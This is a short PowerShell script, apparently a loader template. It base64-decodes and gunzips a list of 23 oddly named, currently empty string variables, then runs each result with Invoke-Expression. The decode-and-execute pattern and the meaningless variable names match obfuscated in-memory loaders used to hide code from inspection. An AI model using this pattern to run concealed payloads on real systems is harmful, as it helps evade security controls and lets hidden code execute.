#Requires -Version 2

$Skyrockets = ""
$Extirpated = ""
$Uniqueness = ""
$Meadowlark = ""
$Moonstruck = ""
$Bullfights = ""
$Masculines = ""
$Analytical = ""
$Perpetuity = ""
$Elucidates = ""
$Storybooks = ""
$Solicitude = ""
$Absolution = ""
$Inheriting = ""
$Mobilizing = ""
$Cognizance = ""
$Labyrinths = ""
$Mettlesome = ""
$Extricated = ""
$Dispensing = ""
$Araucanian = ""
$Discarding = ""
$Turquoises = ""

function ConvertFrom-Gzip {
    [CmdletBinding()] param([byte[]] $Bytes)
    $is = New-Object IO.MemoryStream(, $Bytes)
    $gs = New-Object IO.Compression.GzipStream $is, ([IO.Compression.CompressionMode]::Decompress)
    $sr = New-Object IO.StreamReader($gs)
    $sbd = $sr.ReadToEnd()
    $sr.Close()
    $gs.Close()
    $is.Close()
    $sbd
}

$Modules = @($Skyrockets,$Extirpated,$Uniqueness,$Meadowlark,$Moonstruck,$Bullfights,$Masculines,$Analytical,$Perpetuity,$Elucidates,$Storybooks,$Solicitude,$Absolution,$Inheriting,$Mobilizing,$Cognizance,$Labyrinths,$Mettlesome,$Extricated,$Dispensing,$Araucanian,$Discarding,$Turquoises)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    ConvertFrom-Gzip -Bytes $Decoded | Invoke-Expression
}
